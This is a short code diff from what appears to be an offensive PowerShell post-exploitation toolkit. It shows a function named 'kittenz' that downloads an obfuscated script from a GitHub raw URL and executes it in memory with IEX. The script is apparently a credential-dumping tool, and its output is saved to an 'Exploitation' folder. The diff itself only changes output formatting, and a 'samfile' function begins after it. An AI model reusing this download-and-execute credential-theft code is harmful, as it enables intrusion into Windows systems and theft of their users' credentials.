@@ -476,7 +476,7 @@ function kittenz
 {
     	IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/obfuskittie.ps1')
 	Write-Host -ForegroundColor Yellow 'Running the small kittie, output to .\Exploitation\kittenz.txt'
-	inbox >> $currentPath\Exploitation\kittenz.txt
+	inbox | out-string -Width 5000 >> $currentPath\Exploitation\kittenz.txt
 }
     
 function samfile
